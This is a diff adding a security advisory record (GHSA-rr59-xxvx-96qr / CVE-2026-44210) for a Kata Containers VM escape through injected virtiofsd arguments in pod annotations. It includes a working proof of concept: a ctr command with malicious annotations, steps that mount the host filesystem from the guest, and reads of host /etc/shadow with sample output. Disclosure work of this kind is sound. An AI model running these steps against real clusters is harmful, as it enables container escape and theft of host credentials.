@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-rr59-xxvx-96qr",
+  "modified": "2026-05-27T00:15:08.117572708Z",
+  "published": "2026-05-26T23:57:58Z",
+  "aliases": [
+    "CVE-2026-44210"
+  ],
+  "summary": "Kata Containers have VM Escape via virtiofsd Argument Injection through Default-Enabled Pod Annotations",
+  "details": "## Summary\n\nKata Containers ships with a default configuration that allows pod creators to inject arbitrary command-line arguments into the virtiofsd process through the `io.katacontainers.config.hypervisor.virtio_fs_extra_args` pod annotation. By injecting `-o source=/` along with `--no-announce-submounts` and `--sandbox=none`, an attacker can override the virtiofsd shared directory to serve the entire host root filesystem into the guest VM. Combined with the `kernel_params` annotation (also enabled by default) to activate the agent debug console, the attacker can mount the host filesystem from inside the VM and read or write any file on the host, including /etc/shadow.\n\n## Details\n\nThe default Kata configuration at configuration.toml line 1 contains:\n\n```\nenable_annotations = [\"enable_iommu\", \"virtio_fs_extra_args\", \"kernel_params\", \"kernel_verity_params\"]\n```\n\nBoth `virtio_fs_extra_args` and `kernel_params` are enabled out of the box. The annotation name is checked against this allowlist, but the annotation value (the actual arguments) is never validated or filtered.\n\nIn utils.go at line 981, the runtime parses the annotation value as a JSON string array and appends it directly to the virtiofsd arguments:\n\n```go\nif value, ok := ocispec.Annotations[vcAnnotations.VirtioFSExtraArgs]; ok {\n    var parsedValue []string\n    err := json.Unmarshal([]byte(value), \u0026parsedValue)\n    // ...\n    sbConfig.HypervisorConfig.VirtioFSExtraArgs = append(\n        sbConfig.HypervisorConfig.VirtioFSExtraArgs, parsedValue...)\n}\n```\n\nIn virtiofsd.go at line 183-198, the runtime builds the virtiofsd command line with `--shared-dir=\u003ckata_managed_path\u003e` first, then appends the extra args:\n\n```go\nargs := []string{\n    \"--syslog\",\n    \"--cache=\" + v.cache,\n    \"--shared-dir=\" + v.sourcePath,\n    fmt.Sprintf(\"--fd=%v\", FdSocketNumber),\n}\nif len(v.extraArgs) != 0 {\n    args = append(args, v.extraArgs...)\n}\n```\n\nThe virtiofsd binary (Rust, from gitlab.com/virtio-fs/virtiofsd) supports a compatibility option `-o source=PATH` that overrides the `--shared-dir` value. This is processed after clap argument parsing, in the `parse_compat()` function at main.rs:462:\n\n```rust\n[\"source\", value] =\u003e opt.shared_dir = Some(value.to_string()),\n```\n\nBecause `-o source=/` is appended after `--shared-dir=\u003ckata_path\u003e`, it overrides the shared directory to `/`. The virtiofsd process then serves the entire host root filesystem through the virtio-fs device.\n\nAdditionally, virtiofsd's `--announce-submounts` flag (set by default) causes the guest kernel to create FUSE automounts for bind mounts within the shared directory. When the shared directory is `/`, this produces automounts that shadow the root directory listing. Injecting `--no-announce-submounts` disables this behavior and exposes the true host root directory contents through the kataShared virtiofs mount.\n\nThe `kernel_params` annotation is used to inject `agent.debug_console agent.debug_console_vport=1026` into the VM kernel command line. This enables a root shell inside the VM through the kata-runtime exec command. From this shell, the attacker mounts the kataShared virtiofs filesystem and accesses host files directly.\n\n## Rootfs bridge (PoC artifact, not a real constraint)\n\nWhen virtiofsd uses `-o source=/` to serve the host root, the Kata agent looks for the container rootfs at `/\u003ccontainer-id\u003e/rootfs` relative to the virtiofs root. The PoC pre-creates this directory on the host to keep the demonstration self-contained with ctr.\n\nIn a real Kubernetes attack, there are several ways to satisfy this without hostPath volumes. An initContainer that runs before the target container can create the directory. Alternatively, the attacker can set up a second pod that writes to a shared persistent volume mounted on the host. The rootfs bridge is a PoC convenience, not a limitation of the vulnerability itself.\n\n## Impact\n\nAn attacker who can create pods on a Kubernetes cluster using Kata Containers with default configuration can:\n\n- Read any file on the host, including /etc/shadow, SSH private keys, and service credentials\n- Write to any file on the host, enabling persistent backdoors, cron jobs, or binary replacement\n- Access other containers' data through the host filesystem\n- Compromise the Kubernetes control plane if it runs on the same host\n\n## Steps to reproduce\n\nTested on a bare metal server (AMD Ryzen 5 3600, Ubuntu 24.04, kernel 6.8.0-100-generic) with Kata Containers 3.28.0 installed from the official release tarball.\n\n1. Install Kata Containers 3.28.0 and configure containerd. Verify that the default configuration has virtio_fs_extra_args in enable_annotations.\n\n2. Pull a container image:\n\n```\nctr image pull docker.io/library/alpine:latest\n```\n\n3. Run the PoC script below, or follow the manual steps:\n\nManual steps:\n\na. Extract a container rootfs and create the rootfs bridge (replace $SB_ID with your container name):\n\n```\nSB_ID=\"poc-exploit\"\nmkdir -p /$SB_ID/rootfs\n\n# Extract alpine rootfs from OCI image\nmkdir -p /tmp/oci-extract\nctr image export /tmp/oci.tar docker.io/library/alpine:latest\ntar xf /tmp/oci.tar -C /tmp/oci-extract\nIDX=$(jq -r '.manifests[0].digest' /tmp/oci-extract/index.json | sed 's/sha256://')\nMFT=$(jq -r '.manifests[] | select(.platform.architecture==\"amd64\") | .digest' \\\n    \"/tmp/oci-extract/blobs/sha256/$IDX\" | head -1 | sed 's/sha256://')\nLYR=$(jq -r '.layers[0].digest' \"/tmp/oci-extract/blobs/sha256/$MFT\" | sed 's/sha256://')\ntar xzf \"/tmp/oci-extract/blobs/sha256/$LYR\" -C /$SB_ID/rootfs\n\nrm -rf /tmp/oci-extract /tmp/oci.tar\n```\n\nb. Create a marker file on the host to prove access:\n\n```\necho \"HOST_ESCAPE_PROOF_$(date)\" \u003e /root/.poc-marker\n```\n\nc. Start the container with the malicious annotations:\n\n```\nctr run \\\n  --runtime io.containerd.kata.v2 \\\n  --annotation 'io.katacontainers.config.hypervisor.virtio_fs_extra_args=[\"--sandbox=none\",\"--seccomp=none\",\"-o\",\"source=/\",\"--no-announce-submounts\"]' \\\n  --annotation 'io.katacontainers.config.hypervisor.kernel_params=agent.debug_console agent.debug_console_vport=1026' \\\n  docker.io/library/alpine:latest $SB_ID \\\n  sleep 3600 \u0026\n```\n\nWait 20-30 seconds for the VM to start. Verify with `ctr task ls`.\n\nd. Enter the VM through the debug console:\n\n```\n/opt/kata/bin/kata-runtime exec $SB_ID\n```\n\ne. Inside the VM, mount the host filesystem and read host files:\n\n```\nmkdir -p /tmp/hostfs\nmount -t virtiofs kataShared /tmp/hostfs\ncat /tmp/hostfs/etc/hostname\ncat /tmp/hostfs/root/.poc-marker\nhead -3 /tmp/hostfs/etc/shadow\ncat /tmp/hostfs/etc/os-release\nls /tmp/hostfs/opt/kata/bin/\n```\n\nf. Observe that /etc/hostname returns the host's hostname (not \"localhost\"), /etc/os-release shows the host OS (Ubuntu, not Alpine), /etc/shadow shows the host's password hashes, and /opt/kata/bin/ lists the Kata binaries installed on the host.\n\n4. Clean up:\n\n```\nctr task kill $SB_ID --signal SIGKILL\nctr container rm $SB_ID\numount /$SB_ID/rootfs\nrm -rf /$SB_ID\n```\n\n## Proof of concept output\n\nBelow is the output from a successful run on Kata Containers 3.28.0. The host runs Ubuntu 24.04. The container image is Alpine Linux.\n\n```\nroot@7a7325d5d804:/# mkdir -p /tmp/h \u0026\u0026 mount -t virtiofs kataShared /tmp/h\nroot@7a7325d5d804:/# echo DIRCOUNT:$(ls /tmp/h/ | wc -l)\nDIRCOUNT:37\nroot@7a7325d5d804:/# echo HOSTNAME:$(cat /tmp/h/etc/hostname)\nHOSTNAME:kata-poc\nroot@7a7325d5d804:/# echo OSREL:$(head -1 /tmp/h/etc/os-release)\nOSREL:PRETTY_NAME=\"Ubuntu 24.04.3 LTS\"\nroot@7a7325d5d804:/# cat /tmp/h/root/.kata-poc-marker\nHOST_NS2_1776058192\nroot@7a7325d5d804:/# echo SHADOW:$(head -1 /tmp/h/etc/shadow)\nSHADOW:root:*:17478:0:99999:7:::\nroot@7a7325d5d804:/# echo BOOT:$(ls /tmp/h/boot 2\u003e/dev/null | head -3)\nBOOT:System.map-6.8.0-100-generic System.map-6.8.0-107-generic config-6.8.0-100-generic\nroot@7a7325d5d804:/# echo KATA:$(ls /tmp/h/opt/kata/bin 2\u003e/dev/null | head -3)\nKATA:cloud-hypervisor containerd-shim-kata-v2 firecracker\n```\n\nThe host's real hostname (kata-poc), OS (Ubuntu 24.04.3 LTS), /etc/shadow content, kernel files in /boot, and Kata binaries in /opt/kata/bin are all visible from inside the VM. The container itself runs Alpine, confirming this is the host filesystem and not the container's own filesystem.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/kata-containers/kata-containers",
+        "purl": "pkg:golang/github.com/kata-containers/kata-containers"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260519062212-ffa59ce3aa78"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rr59-xxvx-96qr/GHSA-rr59-xxvx-96qr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kata-containers/kata-containers/security/advisories/GHSA-rr59-xxvx-96qr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kata-containers/kata-containers/commit/ffa59ce3aa7877d067c9a372df0c329a23a01744"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kata-containers/kata-containers"
+    }
+  ]
+}
